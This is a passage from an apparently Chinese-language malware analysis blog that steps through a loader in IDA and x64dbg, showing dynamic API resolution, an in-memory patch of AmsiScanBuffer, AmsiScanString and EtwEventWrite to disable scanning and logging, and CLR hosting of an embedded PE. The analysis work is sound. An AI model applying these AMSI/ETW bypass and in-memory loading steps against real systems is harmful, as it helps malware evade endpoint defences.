alt="image-20250819194428623"></p><p>然后进行ida重命名，这两个函数依赖的大部分都是AI结合IDA了，可以再去x64dbg看一下，调用这两个函数的时候，参数情况，然后看一下里面的内存情况，对自己的逆向有帮助，可以更好的熟悉操作。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194622836.png" alt="image-20250819194622836"></p><p>比如这个复制内存。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819194904488.png" alt="image-20250819194904488"></p><p>这个内存里面的内容是这样</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195144303.png" alt="image-20250819195144303"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195209783.png" alt="image-20250819195209783"></p><p>执行之后。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195226417.png" alt="image-20250819195226417"></p><p>这个memset操作的，如下。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195308605.png" alt="image-20250819195308605"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195404950.png" alt="image-20250819195404950"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195427451.png" alt="image-20250819195427451"></p><p>这些字节被清零的目的并不明显。我们需要继续分析，希望后续内容能更清晰地揭示其用途。我们将在IDA Pro中将修改后的变量重命名为zeroed_out_mem：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195530061.png" alt="image-20250819195530061"></p><p>继续调用下一个函数，sub_10A68A</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195721262.png" alt="image-20250819195721262"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195743378.png" alt="image-20250819195743378"></p><p>问问</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819195822995.png" alt="image-20250819195822995"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200205865.png" alt="image-20250819200205865"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200337384.png" alt="image-20250819200337384"></p><p>根据AI，第三个参数就是解密的区域，我们看一下解密之前的。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200435492.png" alt="image-20250819200435492"></p><p>解密之后</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200449325.png" alt="image-20250819200449325"></p><p>重命名</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819200548044.png" alt="image-20250819200548044"></p><p>继续往下走</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819230514108.png" alt="image-20250819230514108"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819230603982.png" alt="image-20250819230603982"></p><p>重命名</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232507968.png" alt="image-20250819232507968"></p><p>观看这个循环</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232456739.png" alt="image-20250819232456739"></p><p>问问</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819232736796.png" alt="image-20250819232736796"></p><p>动态调试会进入这个循环里面，我们需要注意sub_10A324的调用时间。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233310755.png" alt="image-20250819233310755"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233343857.png" alt="image-20250819233343857"></p><p>这里进入循环的时候，如下图这个地方，可以看到进行了inc eax和inc edx，两个自己增加的操作，EDX里面存储了一个字符串，比较CL跟EDX是否相等，CL是分号符号。EAX记录了循环了几次的操作。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233422194.png" alt="image-20250819233422194"></p><p>接下来看下面操作ESI，ESI里面存储的也是那个字符串，里面存储的DLL的名字。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233808794.png" alt="image-20250819233808794"></p><p>然后ESI加上了EAX这个计数器，直接就把前面这个dll的名字搞没了，并且使用esp的操作，eax现在是这个dll的名字。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819233957451.png" alt="image-20250819233957451"></p><p>接着就开始调用这个sub_10A324(alloced_mem_copy, v32)函数。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234057987.png" alt="image-20250819234057987"></p><p>调用之后返回值EAX变成了ole32.76d30000</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234204926.png" alt="image-20250819234204926"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234328691.png" alt="image-20250819234328691"></p><p>看起来sub_10A324将DLL的名称作为输入，并返回该DLL的句柄。这个安排是合理的，因为我们之前已经加载并获取了LoadLibraryA的函数指针。我们将这个函数标记为get_dll_base_addr</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234428833.png" alt="image-20250819234428833"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234631589.png" alt="image-20250819234631589"></p><p>此时很清楚，循环的结构是这样的：</p><p>1.将指针沿包含由“；”分隔的DLL名称的字符串前进；</p><p>2.当遇到“；”时，退出内部循环；</p><p>3.加载DLL。</p><p>下一个</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820102926633.png" alt="image-20250820102926633"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103018654.png" alt="image-20250820103018654"></p><p>返回kernel32.GetProcAddress，这是另一个重要的API函数，恶意软件通常使用它来加载API函数，我们还注意到，我们又进入了一个循环<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103143719.png" alt="image-20250820103143719"></p><p>使用相同的循环几次并观察寄存器的策略，我们观察到在每次迭代中，ECX增加4，EBP增加1，并且在EAX中返回一个函数指针。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103332176.png" alt="image-20250820103332176"></p><p>在内存转储中，如果我们在每次迭代期间监视ECX所指向的地址，我们就可以直观的看内存正被函数指针填满</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103744316.png" alt="image-20250820103744316"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153251544.png" alt="image-20250820153251544"></p><p>显然，恶意软件正是在这里保存了已加载API的函数指针。其核心操作是将函数指针存入内存，从而实现动态API解析这一常用技术。这样可以避免导入表中使用了这些dll，有一定的免杀效果。</p><h3 id="部分总结1-动态加载dll与函数"><a href="#部分总结1-动态加载dll与函数" class="headerlink" title="部分总结1 动态加载dll与函数"></a>部分总结1 动态加载dll与函数</h3><p>研究发现，该恶意软件具有以下特征：1.动态加载VirtualAlloc并分配大量内存空间；2.将大量数据从内存复制到新分配的内存区域进行解密，其中包含常用系统DLL的名称列表；3.将这些DLL加载至内存后，查找指定API函数指针，并将它们保存到先前分配的内存中。</p><h3 id="更改AMSI函数的内存保护"><a href="#更改AMSI函数的内存保护" class="headerlink" title="更改AMSI函数的内存保护"></a>更改AMSI函数的内存保护</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820104936145.png" alt="image-20250820104936145"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820152959700.png" alt="image-20250820152959700"></p><p>运行的时候程序是没有到这个函数的，先放着。如下图是进入了下一个if的地方</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153348534.png" alt="image-20250820153348534"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153414255.png" alt="image-20250820153414255"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153439202.png" alt="image-20250820153439202"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153749767.png" alt="image-20250820153749767"></p><p>执行其中的第一个函数get_dll_base_addr，发现获取的是asmi.dll的基址。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154533517.png" alt="image-20250820154533517"></p><p>我们继续向前推进，直到遇到下一个函数sub_10A3C2，查看参数与返回值。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154825115.png" alt="image-20250820154825115"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154848548.png" alt="image-20250820154848548"></p><p>该函数似乎将指向allocatedMEM的指针、amsi.dll的基地址和字符串“AmsiScanBuffer”作为参数，并返回指向AmsiScanBuffer的指针，该指针用于扫描缓冲区中的恶意软件。让我们相应地更新变量和函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160553802.png" alt="image-20250820160553802"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160644226.png" alt="image-20250820160644226"></p><p>四个参数</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160700839.png" alt="image-20250820160700839"></p><p>我们在AmsiScanBuffer指令的起始位置设置了12字节（0xC）的内存空间，将其配置为PAGEExecute_Read_Write模式（0x40），并将原有保护值存入地址。这种将内存空间同时设置为可写和可执行的操作，为恶意攻击者提供了执行任意代码的漏洞。值得注意的是，存储功能指令的内存区域（特别是作为Windows安全核心组件的功能模块）被同时设置为可执行和可写模式，这一操作存在重大安全隐患。</p><h4 id="程序计数器（PC）-相对寻址"><a href="#程序计数器（PC）-相对寻址" class="headerlink" title="程序计数器（PC）-相对寻址"></a>程序计数器（PC）-相对寻址</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161153777.png" alt="image-20250820161153777"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161301772.png" alt="image-20250820161301772"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161315994.png" alt="image-20250820161315994"></p><p>它不需要任何参数，当我们跨过它时，它只会返回函数的地址<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161858998.png" alt="image-20250820161858998"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820162732545.png" alt="image-20250820162732545"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165518395.png" alt="image-20250820165518395"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165621551.png" alt="image-20250820165621551"></p><h4 id="Disabling-AmsiScanBuffer"><a href="#Disabling-AmsiScanBuffer" class="headerlink" title="Disabling AmsiScanBuffer"></a>Disabling AmsiScanBuffer</h4><p>接下来是下一个函数，memcpy<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165716511.png" alt="image-20250820165716511"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165737883.png" alt="image-20250820165737883"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165932465.png" alt="image-20250820165932465"></p><p>12字节将被复制到amsi.AmsiScanBuffer，下图是修改前的amsi的函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170034505.png" alt="image-20250820170034505"></p><p>复制之后的</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170108489.png" alt="image-20250820170108489"></p><p>这部分内容解答了我们之前的疑问：恶意软件通过将内存保护属性修改为 <strong><code>PAGE_EXECUTE_READWRITE</code></strong>（可执行、可读、可写），从而能够直接覆写 <code>AmsiScanBuffer</code>函数的 <strong>前12字节</strong>。</p><p>但我们的疑问仍未完全解开——<strong>恶意软件为何要这样做？</strong></p><p>由于这些字节是机器指令（instructions），通过对比 <code>memcpy</code>调用前后 <code>AmsiScanBuffer</code>的反汇编指令变化，或许能揭示其真实意图。</p><p>将执行状态回退到 <code>memcpy</code>调用前的时刻，并检查此时 <code>AmsiScanBuffer</code>的反汇编指令。</p><p>修改前：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170332488.png" alt="image-20250820170332488"></p><p>修改后：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170425836.png" alt="image-20250820170425836"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170600235.png" alt="image-20250820170600235"></p><p>第一条指令 <code>mov eax, [esp+18]</code>将 <code>esp+18</code>处的内容（即 <code>AmsiScanBuffer</code>的第六个参数）加载到 <code>EAX</code>寄存器。根据 <code>AmsiScanBuffer</code>的官方文档，最后一个参数 <code>AMSI_RESULT</code>是一个指针，指向缓冲区扫描的结果。</p><p>接下来的指令 <code>and [eax], 0</code>将 <code>AMSI_RESULT</code>的值设为 <code>0</code>，根据 <code>amsi.h</code>的定义，这对应 <strong><code>AMSI_RESULT_CLEAN</code></strong>，表示缓冲区中未检测到恶意内容。</p><p>总之，AmsiScanBuffer已在内存中打补丁，以始终返回AMSI_RESULT_CLEAN。这是用于绕过AMSI的许多方法之一。</p><h4 id="恢复AmsiScanBuffer的内存保护"><a href="#恢复AmsiScanBuffer的内存保护" class="headerlink" title="恢复AmsiScanBuffer的内存保护"></a>恢复AmsiScanBuffer的内存保护</h4><p>我们继续执行下一个函数调用，该调用同样使用指针运算</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171054902.png" alt="image-20250820171054902"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171113397.png" alt="image-20250820171113397"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171124000.png" alt="image-20250820171124000"></p><p>与第一次调用VirtualProtect类似，第一个参数是指向AmsiScanBuffer的指针，第二个参数是12，但第三个参数这次是0x20。如果我们查阅Microsoft关于VirtualProtect的文档，就会发现该值对应PAGE_EXECUTE_READ。这表明恶意软件似乎正在将内存保护恢复到其原始值</p><h4 id="Disabling-AmisScanString"><a href="#Disabling-AmisScanString" class="headerlink" title="Disabling AmisScanString"></a>Disabling AmisScanString</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171331769.png" alt="image-20250820171331769"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171623581.png" alt="image-20250820171623581"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171649499.png" alt="image-20250820171649499"></p><p>这部分运行到最后，跟刚刚的函数修改的一样，都是首先修改内存保护，然后修改内容，然后再把保护修改回去。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171931415.png" alt="image-20250820171931415"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172036476.png" alt="image-20250820172036476"></p><h3 id="禁用EtwEventWrite"><a href="#禁用EtwEventWrite" class="headerlink" title="禁用EtwEventWrite"></a>禁用EtwEventWrite</h3><p>让我们退出sub_108106并将其标记为disable_amsi，然后进入下一个函数sub_108201</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172217249.png" alt="image-20250820172217249"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172408303.png" alt="image-20250820172408303"></p><p>如果我们查看sub_108201的反编译代码，会发现它与disable_amsi非常相似，都调用了get_dll_base_addr、get_dll_func和memcpy函数。因此，我们的直觉告诉我们，这个函数可能与disable_amsi类似。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172520011.png" alt="image-20250820172520011"></p><p>接下来，我们将跳转到get_dll_func函数，该函数会返回指向ntdll的指针。EtwEventWrite（图3.7.4)。EtwEventWrite用于记录事件（例如网络连接、磁盘I&#x2F;O、进程创建），这些事件可以被EDRs和防病毒工具等安全系统捕获，以检测威胁。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172738345.png" alt="image-20250820172738345"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172752986.png" alt="image-20250820172752986"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172820348.png" alt="image-20250820172820348"></p><p>更改这个函数内存保护</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172843530.png" alt="image-20250820172843530"></p><p>复制内容到函数开始</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172956857.png" alt="image-20250820172956857"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820173044690.png" alt="image-20250820173044690"></p><p>我们将退出sub_108201并将其重命名为disable_etw_event_write</p><h3 id="部分总结2-禁用安全功能asmi和etw"><a href="#部分总结2-禁用安全功能asmi和etw" class="headerlink" title="部分总结2 禁用安全功能asmi和etw"></a>部分总结2 禁用安全功能asmi和etw</h3><p>总而言之，恶意软件通过以下操作禁用了几个对安全至关重要的重要Windows API函数：</p><ol><li>获取amsi.dll和ntdll.dll的基地址</li><li>获取AmsiScanBuffer、AmsiScanString和EtwEventWrite的函数指针</li><li>调用VirtualProtect将内存保护设置为RWX</li><li>重写指令中的一些字节以使这些函数无用</li><li>调用VirtualProtect将内存保护设置为R-X</li></ol><p>这种内存修补方法通常被恶意行为者或红队用来绕过ETW和AMSI等组件。<br>我们还观察到恶意软件使用相对于PC的寻址来定位资源，例如用于重写AmsiScanBuffer、AmsiScanString和EtwEventWrite的伪代码。</p><h3 id="将PE文件复制到内存"><a href="#将PE文件复制到内存" class="headerlink" title="将PE文件复制到内存"></a>将PE文件复制到内存</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820213330294.png" alt="image-20250820213330294"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820213357102.png" alt="image-20250820213357102"></p><p>内存复制之后，查看分配的内存情况。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820214434079.png" alt="image-20250820214434079"></p><p>这些字节的目的并不明显，因此我们将向前推进，直到下一次函数调用为止sub_10A795</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820214844629.png" alt="image-20250820214844629"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215031375.png" alt="image-20250820215031375"></p><p>问一下AI</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215349798.png" alt="image-20250820215349798"></p><p>执行之后，发现下面是MZ开头，是PE文件格式的特征。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215510727.png" alt="image-20250820215510727"></p><p>对于经验丰富的研究人员或经常处理PE文件的人来说，字节‘4D 5A’或字符串‘MZ’可能显得眼熟——这些正是PE文件的魔法字节。当内存被分配并填满PE文件的字节时，这种情况非常可疑，因为这些数据很可能以某种方式被执行。我们需要记录下这个内存地址，以便后续查看其使用情况：</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>继续向下分析，经过了一个switch之后，运行到了sub_108D67</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221356385.png" alt="image-20250820221356385"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221427519.png" alt="image-20250820221427519"></p><p>看一下参数</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221648783.png" alt="image-20250820221648783"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820223911325.png" alt="image-20250820223911325"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001443043.png" alt="image-20250821001443043"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001503202.png" alt="image-20250821001503202"></p><p>步骤 2：C++ 代码调用 .NET DLL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: clr_host.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;metahost.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;mscoree.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr;</span><br><span class="line">    ICLRMetaHost *pMetaHost = <span class="literal">NULL</span>;</span><br><span class="line">    ICLRRuntimeInfo *pRuntimeInfo = <span class="literal">NULL</span>;</span><br><span class="line">    ICLRRuntimeHost *pRuntimeHost = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 初始化 CLR</span></span><br><span class="line">    hr = <span class="built_in">CLRCreateInstance</span>(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;pMetaHost);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CLRCreateInstance failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取最新 .NET 运行时</span></span><br><span class="line">    hr = pMetaHost-&gt;<span class="built_in">GetRuntime</span>(<span class="string">L&quot;v4.0.30319&quot;</span>, IID_ICLRRuntimeInfo, (LPVOID*)&amp;pRuntimeInfo);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetRuntime failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 启动运行时</span></span><br><span class="line">    hr = pRuntimeInfo-&gt;<span class="built_in">GetInterface</span>(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&amp;pRuntimeHost);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetInterface failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hr = pRuntimeHost-&gt;<span class="built_in">Start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Start failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pRuntimeHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 执行 .NET 方法</span></span><br><span class="line">    DWORD retVal;</span><br><span class="line">    hr = pRuntimeHost-&gt;<span class="built_in">ExecuteInDefaultAppDomain</span>(</span><br><span class="line">        <span class="string">L&quot;HelloWorld.dll&quot;</span>,  <span class="comment">// .NET DLL 路径</span></span><br><span class="line">        <span class="string">L&quot;HelloWorld&quot;</span>,      <span class="comment">// 类名</span></span><br><span class="line">        <span class="string">L&quot;SayHello&quot;</span>,        <span class="comment">// 静态方法名</span></span><br><span class="line">        <span class="string">L&quot;&quot;</span>,                <span class="comment">// 参数（无）</span></span><br><span class="line">        &amp;retVal</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ExecuteInDefaultAppDomain failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 清理资源</span></span><br><span class="line">    pRuntimeHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001611715.png" alt="image-20250821001611715"></p><p>根据文档，CLRCreateInstance的参数为：<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821005417838.png" alt="image-20250821005417838"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821010307076.png" alt="image-20250821010307076"></p><p>v3(alloced_mem_copy + 2128, alloced_mem_copy + 2144, buf) 函数执行之后，第三个参数的内存地址变成了这样。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011044489.png" alt="image-20250821011044489"></p><p>做个标记，这个就是接口，调用CLRCreateInstance创建了ICLREMetaHost接口，并将它的指针保存（当前函数作用域内的buf）我们可以预期这个指针将用于调用ICLRMetaHost接口的函数</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011227239.png" alt="image-20250821011227239"></p><p>IDA加载类型信息库并创建自定义结构</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011841892.png" alt="image-20250821011841892"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011853056.png" alt="image-20250821011853056"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011904874.png" alt="image-20250821011904874"></p><p>接下来，看起来前20个字节被填充了版本字符串，且该字符串已被转换为宽字符字符串。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103155779.png" alt="image-20250821103155779"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103437748.png" alt="image-20250821103437748"></p><p>接下来运行这个函数的时候发现dbg没有解析，这里进行导入dll</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103715126.png" alt="image-20250821103715126"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103618759.png" alt="image-20250821103618759"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104342463.png" alt="image-20250821104342463"></p><p>现在有这个解析了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104405840.png" alt="image-20250821104405840"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104557156.png" alt="image-20250821104557156"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104611611.png" alt="image-20250821104611611"></p><p><img 